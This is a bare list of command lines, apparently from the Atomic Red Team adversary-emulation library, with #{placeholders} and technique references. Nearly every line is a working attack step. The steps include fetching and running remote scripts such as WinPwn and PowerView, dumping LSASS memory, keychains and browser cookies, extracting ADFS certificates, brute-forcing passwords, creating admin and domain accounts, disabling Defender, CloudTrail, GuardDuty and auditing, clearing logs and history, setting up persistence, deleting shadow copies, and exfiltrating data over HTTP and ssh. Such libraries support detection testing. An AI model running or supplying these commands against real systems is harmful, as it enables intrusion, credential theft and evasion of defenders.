Import-Module -Name Az.Resources;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzAccount -Credential $Credential;;$user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}" -or $_.UserPrincipalName -eq "#{user_principal_name}" };if ($user -eq $null) { Write-Warning "User not found"; exit };$subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"};if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit };$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"};if ($role -eq $null) { Write-Warning "Role not found"; exit };;New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription;Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
sudo echo '' > #{system_log_path}
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*;C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*;C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{remote_host} -u #{user_name} -p #{password} -accepteula "C:\Windows\System32\calc.exe"
get-process | ?{$_.Description -like "*virus*"};get-process | ?{$_.Description -like "*carbonblack*"};get-process | ?{$_.Description -like "*defender*"};get-process | ?{$_.Description -like "*cylance*"};get-process | ?{$_.Description -like "*mc*"};get-process | ?{$_.ProcessName -like "*mc*"};get-process | Where-Object { $_.ProcessName -eq "Sysmon" }
ufw logging off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f;reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
net user /add "#{username}" "#{password}";net localgroup administrators "#{username}" /add
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');wificreds -consoleoutput -noninteractive  
echo "#{command}" > /etc/cron.daily/#{cron_script_name}&&echo "#{command}" > /etc/cron.hourly/#{cron_script_name}&&echo "#{command}" > /etc/cron.monthly/#{cron_script_name}&&echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
$RunOnceKey = "#{reg_key_path}";set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore;$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1";$output = "$env:TEMP\Invoke-Phant0m.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);cd $env:TEMP;Import-Module .\Invoke-Phant0m.ps1;Invoke-Phant0m
PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
[ "$(uname)" = 'FreeBSD' ] && sysrc tor_enable="YES" && service tor start || sudo systemctl start tor
date
echo '#{text_to_append}' >> /etc/profile
rm -rf #{folder_to_delete}
schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f;schtasks /query /tn win32times
bitsadmin.exe /create #{bits_job_name};bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file};bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL;bitsadmin.exe /resume #{bits_job_name};ping -n 5 127.0.0.1 >nul 2>&1;bitsadmin.exe /complete #{bits_job_name}
$excelApp = New-Object -COMObject "Excel.Application";if(-not $excelApp.path.contains("Program Files (x86)")){;    Write-Host "64-bit Office";    Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll";};else{;  Write-Host "32-bit Office";  Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll";};$ver = $excelApp.version;$ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options";Remove-Item $ExcelRegPath -ErrorAction Ignore;New-Item -type Directory $ExcelRegPath | Out-Null;New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null;$excelApp.Quit();Start-Process "Excel"
sudo insmod #{rootkit_path}/#{rootkit_name}.ko
wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command_to_execute}';New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute";Start-Process -FilePath $env:windir\system32\sdclt.exe;Start-Sleep -s 3
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force
net user "#{username}" "#{password}" /add /domain
where /R C:\Users\ places.sqlite
bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Kerberoasting -consoleoutput -noninteractive
echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh
trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG&&echo "Hello World!"&&cat #{output_file}
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team"";reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f;iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore);if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id };C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
"#{venv_path}\Scripts\pypykatz" live lsa 
net user #{user_account} #{new_user_password} /add;net.exe user #{user_account} #{new_password}
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
auditpol /clear /y;auditpol /remove /allusers
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Snaffler -noninteractive -consoleoutput
tasklist.exe;sc query;sc query state= all
bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
sudo security dump-keychain -d login.keychain
cp $HISTFILE $HISTFILE.OLD&&if ((${#HISTFILE[@]})); then echo $HISTFILE; fi&&echo "" > $HISTFILE&&if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo "$HISTFILE is larger than 1k"; fi&&ls -la $HISTFILE &&cat $HISTFILE&&history -c &&if [ $(history |wc -l) -eq 1 ]; then echo "History cache cleared"; fi
$x = Get-Random -Minimum 2 -Maximum 9999;$y = Get-Random -Minimum 2 -Maximum 9999;$z = Get-Random -Minimum 2 -Maximum 9999;$w = Get-Random -Minimum 2 -Maximum 9999;Write-Host HaHa_$x$y$z;;$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name;;foreach($member in $fmm) {;    if($member -like "*Administrator*") {;        $account = $member.Name.Split("\")[-1] # strip computername\;        $originalDescription = (Get-LocalUser -Name $account).Description;        Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description;        Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation;        Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME;        };    }
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}&&if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;&&find . -type f -iname *.pdf >> #{output_file}&&cat #{output_file}&&find . -type f -name ".*"
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';;                EventNameSpace='root\CimV2';;                QueryLanguage="WQL";;                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};;$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs;;$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';;                ScriptingEngine='VBScript';;                ScriptText=';                Set objws = CreateObject("Wscript.Shell");                objws.Run "notepad.exe", 0, True;                '};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs;;$FilterToConsumerArgs = @{;Filter = $Filter;;Consumer = $Consumer;;};$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
stop-process -name "chrome" -force -erroraction silentlycontinue;"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
net localgroup;net localgroup "Administrators"
if(-not (Test-Path #{filepath})){ ;  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." };};[System.Net.ServicePointManager]::Expect100Continue = $false;$filecontent = Get-Content -Path #{filepath};Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
sc stop WinDefend;sc config WinDefend start=disabled;sc query WinDefend
$process = Start-Process #{spawn_process_path} -passthru;$PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');spoolvulnscan -noninteractive -consoleoutput
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-ExchangeOnline -Credential $creds;Set-MailboxAuditBypassAssociation -Identity "#{target_email}" -AuditBypassEnabled $true
get-localgroup;Get-LocalGroupMember -Name "Administrators"
tail /var/log/ufw.log
$installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi";Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi";msiexec /i $installer /qn
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
Import-Module -Name AzureAD;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzureAD -Credential $Credential > $null;;$app = Get-AzureADApplication -SearchString "#{application_name}" | Select-Object -First 1;if ($app -eq $null) { Write-Warning "Application not found"; exit };;# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long;$credNotAfter = (Get-Date).AddDays(1);$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry;;$cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter;$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData());Write-Host "Generated certificate ""$($cert.Thumbprint)""";;New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter;;Start-Sleep -s 30;$tenant = Get-AzureADTenantDetail;$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint;Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)";Write-Host "End of Hijacking"
"#{dumpert_exe}"
echo #{bash_encoded} | b64decode -r | sh&&echo #{dash_encoded} | b64decode -r | sh&&echo #{fish_encoded} | b64decode -r | sh&&echo #{sh_encoded} | b64decode -r | sh
if (-not (Test-Path #{dest_path})) {;New-Item -Path #{dest_path} -ItemType Directory;} else {;Write-Host "Directory #{dest_path} already exists." };Copy-Item -Path "C:\windows\system32\customshellhost.exe" -Destination "#{dest_path}\customshellhost.exe" -Force;Copy-Item -Path "C:\windows\system32\calc.exe" -Destination "#{dest_path}\explorer.exe" -Force;#{dest_path}\customshellhost.exe
mv #{settings_json_def} #{settings_json_tmp};Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "#{settings_json_def}";wt.exe
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ;Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
export ART='echo "Atomic Red Team was here... T1059.004"'&&echo $ART |/bin/sh
Get-NetTCPConnection
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash&&wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');itm4nprivesc -noninteractive -consoleoutput
set +o history&&echo 'set +o history' >> ~/.bashrc&&. ~/.bashrc&&history -c
cd "PathToAtomicsFolder\..\ExternalPayloads";.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} "PathToAtomicsFolder\..\ExternalPayloads\username.txt"
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
$x = Get-Random -Minimum 2 -Maximum 99;$y = Get-Random -Minimum 2 -Maximum 99;$z = Get-Random -Minimum 2 -Maximum 99;$w = Get-Random -Minimum 2 -Maximum 99;;Import-Module ActiveDirectory;$account = "#{account_prefix}-$x$y$z";New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args};Add-ADGroupMember "#{group}" $account
echo $HISTFILE&&export HISTFILE="/dev/null"&&if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; fi&&# -> $HISTFILE is /dev/null
for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
find /usr/bin -perm -4000
rundll32.exe "#{input_file}",#2
if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {;  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported";  exit 1;};;[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null;$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389);;$passwordList = Get-Content -Path "#{passwords_path}";foreach ($password in $passwordList){;  $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}");  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth});  try {;    Write-Host " [-] Attempting ${password} on account #{user}.";    $conn.bind();    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success;    Write-Host " [!] #{user}:${password} are valid credentials!";  } catch {;    Write-Host $_.Exception.Message;  };};Write-Host "End of bruteforce"
Import-Module MSOnline;$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password;Connect-MsolService -Credential $Credential;Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "#{target_user}"
vssadmin.exe create shadow /for=#{drive_letter};mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
$PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
$mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText;$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My;Set-Location Cert:\LocalMachine\My;Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd
reg add "hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
sc.exe \\#{remote_host} create #{service_name} binPath= "#{binary_path}" start=#{startup_type} type=#{service_type};sc.exe \\#{remote_host} start #{service_name}
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
history -c
wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=subnet) #{optional_args}
net share #{share_name} /delete
Import-Module -Name AzureAD;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzureAD -Credential $Credential > $null;;$sp = Get-AzureADServicePrincipal -SearchString "#{service_principal_name}" | Select-Object -First 1;if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit };;# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long;$credNotAfter = (Get-Date).AddDays(1);$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry;;$cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter;$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData());Write-Host "Generated certificate ""$($cert.Thumbprint)""";;New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter;;Start-Sleep -s 30;$tenant = Get-AzureADTenantDetail;$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint;Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)";Write-Host "End of Hijacking"
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Generalrecon -consoleoutput -noninteractive
Import-Module -Name AzureAD;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzureAD -Credential $Credential;;$user = Get-AzureADUser -Filter "DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'";if ($user -eq $null) { Write-Warning "User not found"; exit };$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'";if ($role -eq $null) { Write-Warning "Role not found"; exit };Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId;Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"
find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}&&exit 0
echo -n 111-11-1111 | b64encode -r -&&curl -XPOST #{base64_data}.#{destination_url}
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
"C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe" /reregserver;regsvr32 /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll";rundll32 "C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init";sc create VBoxDRV binpath= "C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV;sc start VBoxDRV
setspn -T #{domain_name} -Q */*
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/&&docker run --name t1046_container  -d -t t1046&&docker exec t1046_container ./test.sh
detectorId=$(aws guardduty create-detector --enable --region "#{region}" | grep -oP '(?<="DetectorId": ")[^"]*')&&aws guardduty update-detector --no-enable --detector-id $detectorId&&aws guardduty delete-detector --detector-id $detectorId
shutdown /r /t #{timeout}
cmd /c '#{GPG_Exe_Location}' -c '#{File_to_Encrypt_Location}'
Import-Module ActiveDirectory -Force ;Import-Module AADInternals -Force | Out-Null;#Get Configuration;$dcServerName = (Get-ADDomainController).HostName;$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq "#{adfs_service_account_name}";$PWord = ConvertTo-SecureString -String "#{replication_password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord;# use DCSync to fetch the ADFS service account's NT hash;$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex;$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name};# Get certificates decryption key;$Configuration = [xml]$ADFSConfig;$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group;$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName;$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn;$base = "LDAP://CN=$group,$container,$parent";$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base));$ADSearch.Filter = '(name=CryptoPolicy)';$ADSearch.PropertiesToLoad.Clear();$ADSearch.PropertiesToLoad.Add("displayName") | Out-Null;$aduser = $ADSearch.FindOne();$keyObjectGuid = $ADUser.Properties["displayName"] ;$ADSearch.PropertiesToLoad.Clear();$ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null;$ADSearch.Filter="(l=$keyObjectGuid)";$aduser=$ADSearch.FindOne() ;$key=[byte[]]$aduser.Properties["thumbnailphoto"][0] ;# Get encrypted certificates from configuration and decrypt them;Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key;Get-ChildItem | Where-Object {$_ -like "ADFS*"};Write-Host "`nCertificates retrieved successfully"
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -sc dclist
ip neighbour show
Start-Process "#{dirlister_path}";Start-Sleep -Second 4;Stop-Process -Name "DirLister"
cmd /c "#{ncat_exe}" #{server_ip} #{server_port}
chown -R #{owner} #{file_or_folder}
netsh advfirewall firewall add rule name="Open Port to Any" dir=in protocol=tcp localport=#{local_port} action=allow profile=any
Start-Process "#{nsudo_path}" -Argument "-U:T -P:E cmd";Start-Sleep -Second 5;Stop-Process -Name "cmd" -force -erroraction silentlycontinue
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');passhunt -local $true -noninteractive
net user /add "#{username}" "#{password}"
sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\"";sc start Fax
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
$excludedExts= "#{excluded_exts}";Add-MpPreference -ExclusionExtension  $excludedExts
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
python2 laZagne.py all
Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore
powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct;powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct
dir /s c:\ >> #{output_file};dir /s "c:\Documents and Settings" >> #{output_file};dir /s "c:\Program Files\" >> #{output_file};dir "%systemdrive%\Users\*.*" >> #{output_file};dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> #{output_file};dir "%userprofile%\Desktop\*.*" >> #{output_file};tree /F >> #{output_file}
InfDefaultInstall.exe "#{inf_to_execute}"
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 3
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
sudo lsmod | grep -i "vboxsf\|vboxguest"&&sudo lsmod | grep -i "vmw_baloon\|vmxnet"&&sudo lsmod | grep -i "xen-vbd\|xen-vnif"&&sudo lsmod | grep -i "virtio_pci\|virtio_net"&&sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
echo '' > /var/log/messages
"#{uacme_exe}"
aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}&&aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}&&aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
netsh advfirewall firewall show rule name=all
reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 1 /f;reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d Administrator /f;reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d contoso.com /f;reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d password1 /f
"#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}
